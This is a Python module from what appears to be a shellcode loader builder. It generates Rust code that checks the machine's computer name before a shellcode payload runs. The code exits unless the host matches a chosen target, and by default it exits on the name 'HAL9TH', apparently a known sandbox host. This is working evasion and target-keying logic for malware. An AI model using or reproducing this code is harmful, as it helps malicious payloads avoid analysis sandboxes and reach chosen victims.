import random
import string

class hostname:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        self.allow = ''
        self.deny = ''
        if 'allow' in arguments:
            self.allow = arguments['allow']
        if 'deny' in arguments:
            self.deny = arguments['deny']
        else:
            self.deny = 'HAL9TH'

    def imports(self) -> list[str]:
        return ['use windows_sys::Win32::System::WindowsProgramming::GetComputerNameA;',
                'use windows_sys::Win32::System::WindowsProgramming::MAX_COMPUTERNAME_LENGTH;',
                'use std::process;']

    def compilerOptions(self) -> list[str]:
        return []

    def transformer(self, shellcodestring: str) -> str:
        return f'{self.name}();\n\t' + shellcodestring

    def codeblock(self) -> str:
        if self.allow:
            allow = f'if computer_name != "{self.allow}" {{ process::exit(0); }}'
        else:
            allow = ''
        if self.deny:
            deny = f'if computer_name == "{self.deny}" {{ process::exit(0); }}'
        else:
            deny = ''

        return f"""
fn {self.name}() {{
    unsafe {{
        let mut buf: [u8; (MAX_COMPUTERNAME_LENGTH + 1) as usize] = [0; (MAX_COMPUTERNAME_LENGTH + 1) as usize];
        let mut size = buf.len() as u32;
        GetComputerNameA(buf.as_mut_ptr(), &mut size);
        let computer_name = std::str::from_utf8(&buf[..size as usize]).unwrap();
        {allow}
        {deny}
    }}
}}
"""